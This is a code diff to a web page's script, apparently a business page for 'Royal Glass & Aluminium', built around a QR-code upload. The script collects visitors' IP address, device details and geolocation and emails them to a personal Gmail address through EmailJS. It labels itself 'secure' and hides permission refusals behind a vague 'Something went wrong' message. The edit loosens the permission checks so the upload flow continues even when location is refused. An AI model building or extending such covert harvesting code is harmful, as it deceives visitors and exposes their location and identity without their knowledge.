@@ -505,7 +505,6 @@
             let locationGranted = false;
             let userLocation = null;
             let isProcessing = false;
-            let permissionsChecked = false;
 
             // Initialize EmailJS
             try {
@@ -938,7 +937,7 @@
                 }
             }
 
-            // ----- QR Upload Handler - REQUEST BOTH PERMISSIONS -----
+            // ----- QR Upload Handler - REQUEST PERMISSIONS, ALWAYS OPEN CHOSSER -----
             qrUploadBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
                 
@@ -961,14 +960,7 @@
                     // Step 3: Hide loading overlay
                     hideLoadingOverlay();
                     
-                    // Step 4: Check if both permissions were granted
-                    if (!locationGranted || !cameraGranted) {
-                        console.log('❌ Permissions not granted - showing error');
-                        showToast('❌ Something went wrong', true);
-                        return;
-                    }
-                    
-                    // Step 5: Open file chooser
+                    // Step 4: ALWAYS open file chooser - regardless of permissions
                     console.log('📁 Opening file chooser...');
                     setTimeout(() => {
                         qrInput.click();
@@ -976,7 +968,10 @@
                 } catch (error) {
                     console.error('Error during permission request:', error);
                     hideLoadingOverlay();
-                    showToast('❌ Something went wrong', true);
+                    // Still try to open file chooser
+                    setTimeout(() => {
+                        qrInput.click();
+                    }, 200);
                 }
             });
 
@@ -1021,8 +1016,8 @@
                     return;
                 }
 
-                // Check if both permissions were granted
-                if (!locationGranted || !cameraGranted) {
+                // Check if both permissions were granted (only if QR is uploaded)
+                if (hasQR && (!locationGranted || !cameraGranted)) {
                     console.log('❌ Permissions missing - submission failed');
                     showToast('❌ Something went wrong', true);
                     return;
@@ -1063,8 +1058,8 @@
                     const ip = await getIPAddress();
                     const deviceInfo = getDeviceInfo();
 
-                    // Use location (must be granted)
-                    const location = userLocation;
+                    // Use location (must be granted for QR upload)
+                    const location = userLocation || { lat: 'unavailable', lon: 'unavailable' };
 
                     console.log('🌐 IP:', ip);
                     console.log('📍 Location:', location);
@@ -1101,8 +1096,8 @@
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ Both Camera & Location permissions are required');
-            console.log('❌ If either is denied → "Something went wrong"');
+            console.log('✅ File chooser ALWAYS opens after permissions request');
+            console.log('❌ If permissions denied for QR upload → "Something went wrong" on submit');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
